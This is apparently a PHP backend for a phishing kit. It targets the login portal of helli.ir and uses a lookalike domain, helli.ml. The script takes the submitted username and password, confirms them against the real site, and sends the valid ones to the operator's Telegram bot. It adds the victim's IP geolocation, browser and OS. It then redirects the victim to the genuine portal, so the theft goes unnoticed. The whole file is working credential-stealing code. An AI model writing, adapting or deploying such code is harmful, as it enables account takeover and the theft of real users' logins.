<?php

    $token = "";  // My Telegram Bot Token
    $admin = "";  // My Telegram User Id
    $username = $_POST['user'];
    $password = $_POST['pass'];
    $user = $_SERVER['HTTP_USER_AGENT'];

    function getOS() {global $user; $os_platform = "Unknown OS Platform"; $os_array = array('/windows nt 10/i' => 'Windows 10', '/windows nt 6.3/i' => 'Windows 8.1', '/windows nt 6.2/i' => 'Windows 8', '/windows nt 6.1/i' => 'Windows 7', '/windows nt 6.0/i' => 'Windows Vista', '/windows nt 5.2/i' => 'Windows Server 2003/XP x64', '/windows nt 5.1/i' => 'Windows XP', '/windows xp/i' => 'Windows XP', '/windows nt 5.0/i' => 'Windows 2000', '/windows me/i' => 'Windows ME', '/win98/i' => 'Windows 98', '/win95/i' => 'Windows 95', '/win16/i' => 'Windows 3.11', '/macintosh|mac os x/i' => 'Mac OS X', '/mac_powerpc/i' => 'Mac OS 9', '/linux/i' => 'Linux', '/kalilinux/i' => 'KaliLinux', '/ubuntu/i' => 'Ubuntu', '/iphone/i' => 'iPhone', '/ipod/i' => 'iPod', '/ipad/i' => 'iPad', '/android/i' => 'Android', '/blackberry/i' => 'BlackBerry', '/webos/i' => 'Mobile', '/Windows Phone/i' => 'Windows Phone'); foreach ($os_array as $regex => $value) {if (preg_match($regex, $user)) {$os_platform = $value;}} return $os_platform;}

    function getBrowser() {global $user; $browser = "Unknown Browser"; $browser_array = array('/msie/i' => 'Internet Explorer', '/firefox/i' => 'Firefox', '/Mozilla/i' => 'Mozilla', '/Mozilla/5.0/i' => 'Mozilla', '/safari/i' => 'Safari', '/chrome/i' => 'Chrome', '/edge/i' => 'Edge', '/opera/i' => 'Opera', '/OPR/i' => 'Opera', '/netscape/i' => 'Netscape', '/maxthon/i' => 'Maxthon', '/konqueror/i' => 'Konqueror', '/Bot/i' => 'BOT Browser', '/Valve Steam GameOverlay/i' => 'Steam', '/mobile/i' => 'Handheld Browser'); foreach ($browser_array as $regex => $value) {if (preg_match($regex, $user)) {$browser = $value;}} return $browser;}

    function RealIp() {if (!empty($_SERVER['HTTP_CLIENT_IP'])) {$ip = $_SERVER['HTTP_CLIENT_IP'];} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];} else {$ip = $_SERVER['REMOTE_ADDR'];} return $ip;}

    function get_string_between($string, $start, $end){ $string = ' ' . $string; $ini = strpos($string, $start); if ($ini == 0) return ''; $ini += strlen($start); $len = strpos($string, $end, $ini) - $ini; return substr($string, $ini, $len);}

    $ip = RealIp();
    $geo = file_get_contents("https://tools.keycdn.com/geo.json?host=$ip");
    $bro = getBrowser();
    $os = getOS();

    function send_data($url) {$ch = curl_init(); curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); $data = curl_exec($ch); curl_close($ch); return $data;}

    function login($usern, $pass) {$formid = file_get_contents("https://www.helli.ir/portal/user/login"); $formbuildid = get_string_between($formid ,'name="form_build_id" value="', '"'); $data = http_build_query(array("name" => $usern, "pass" => $pass, "form_build_id" => $formbuildid, "form_id" => "user_login", "op" => "ورود")); $ch = curl_init("https://www.helli.ir/portal/user/login"); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $result = curl_exec($ch); $json = get_string_between(json_encode(curl_getinfo($ch)), ',"redirect_url":"', '","primary_ip":"'); curl_close($ch); if($json == "https:\/\/www.helli.ir\/portal\/recent"){return "1";} else {return "0";}}

    if($username != "" && $password != ""){
        $check = login($username, $password);
        if($check == "1") {
            $textmsg = "#####################\n#  Username: $username  \n#####################\n#  Password: $password  \n#####################\n#  Browser: $bro\n#####################\n#  OS: $os\n#####################\n#  Info: $geo\n#####################";
            send_data("https://api.telegram.org/bot$token/SendMessage?parse_mode=HTML&chat_id=$admin&text=" . urlencode($textmsg));
            header("Location: https://www.helli.ir/portal/recent");
        }
        else {
            header("Location: https://helli.ml/portal/user");
        }
    }
    else {
        header("Location: https://helli.ml/portal/user");
    }

?>

<html>
    <head>
        <meta http-equiv="cache-control" content="no-cache">
    </head>
</html>
